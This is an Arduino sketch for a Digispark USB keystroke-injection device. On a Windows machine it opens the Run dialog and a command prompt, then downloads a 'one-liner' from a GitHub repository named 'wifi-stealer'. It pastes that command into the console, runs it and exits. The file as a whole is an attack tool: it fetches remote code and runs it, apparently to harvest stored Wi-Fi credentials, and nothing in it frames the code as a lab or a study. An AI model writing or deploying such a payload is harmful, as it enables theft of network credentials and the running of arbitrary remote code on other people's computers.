#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(5000); // Wait for OS to recognize the device

    // Open Run Dialog (Win + R)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);

    // Open CMD
    DigiKeyboard.print("cmd /k");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Fetch content and copy to clipboard
    DigiKeyboard.print("curl -s https://raw.githubusercontent.com/5T3P8R0/wifi-stealer/main/one-liner.txt | clip");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    
    // Simulate Ctrl + Shift + V (Paste Special)
    DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(7000);
    DigiKeyboard.print("exit");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
    // Empty loop
}

